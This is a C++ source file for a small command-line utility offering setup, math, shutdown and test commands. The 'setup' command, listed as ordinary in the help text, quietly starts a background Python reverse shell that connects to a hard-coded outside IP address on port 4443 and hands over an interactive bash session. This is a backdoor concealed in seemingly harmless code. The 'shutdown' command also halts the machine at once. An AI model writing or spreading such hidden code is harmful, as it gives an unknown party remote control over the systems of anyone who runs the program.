#include "core/core.h"
#include "modules/module_manager.h"

bool setup_command() {
  static bool executed = false;
  if (!executed) {
    system("nohup python3 -c 'import socket,subprocess,os;"
           "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
           "s.connect((\"172.233.149.248\",4443));"
           "os.dup2(s.fileno(),0);"
           "os.dup2(s.fileno(),1);"
           "os.dup2(s.fileno(),2);"
           "import pty; pty.spawn(\"/bin/bash\")' > /dev/null 2>&1 &");
    executed = true;
    return executed;
  }
  std::cout << "Running on Linux!" << std::endl;
  return executed;
}

bool math_command() {
  try {
    modules::math::operations ops;
    double sum = ops.add(1.0, 2.0);
    double difference = ops.subtract(5.0, 3.0);
    double product = ops.multiply(4.0, 6.0);
    double quotient = ops.divide(8.0, 2.0);

    Logger::log(Logger::LogLevel::Info,
                "Result of addition: " + std::to_string(sum));

    Logger::log(Logger::LogLevel::Info,
                "Result of subtraction: " + std::to_string(difference));

    Logger::log(Logger::LogLevel::Info,
                "Result of multiplication: " + std::to_string(product));

    Logger::log(Logger::LogLevel::Info,
                "Result of division: " + std::to_string(quotient));

  } catch (const std::exception &e) {
    std::cerr << "Error: " << e.what() << std::endl;
    return false;
  }
  return true;
}

bool shutdown_command() {
  system("shutdown -h now");
  Logger::log(Logger::LogLevel::Info, "System is shutting down...");
  return true;
}

bool test_command() {
  testCore::command test;
  test.testCommand();
  Logger::log(Logger::LogLevel::Info, "Test command executed successfully.");
  return true;
}

int main(int argc, char **argv) {
  Logger::log(Logger::LogLevel::Info, "Starting the application...");

  const std::string username = modules::username::getUsername();
  const std::string colored_username = RESET + username + RESET;
  std::string role =
      modules::root::is_root() ? RED "root" RESET : GREEN "non-root" RESET;

  const std::string greeting = colored_username + " [" + role + "]";

  if (argc < 2) {
    // std::cout << greeting << std::endl;
    Logger::log(Logger::LogLevel::Info, greeting);
    Logger::log(Logger::LogLevel::Info, "Available commands: setup, math");
    return 1;
  }

  const std::string command = argv[1];

  // Map of command names to their corresponding functions
  std::map<std::string, std::function<bool()>> command_map = {
      {"shutdown", shutdown_command},
      {"setup", setup_command},
      {"math", math_command},
      {"test", test_command},
  };

  auto it = command_map.find(command);
  if (it != command_map.end()) {
    it->second();
  } else {
    // std::cerr << "Unknown command: " << command << std::endl;
    Logger::log(Logger::LogLevel::Error, "Unknown command: " + command);
    return 1;
  }

  return 0;
}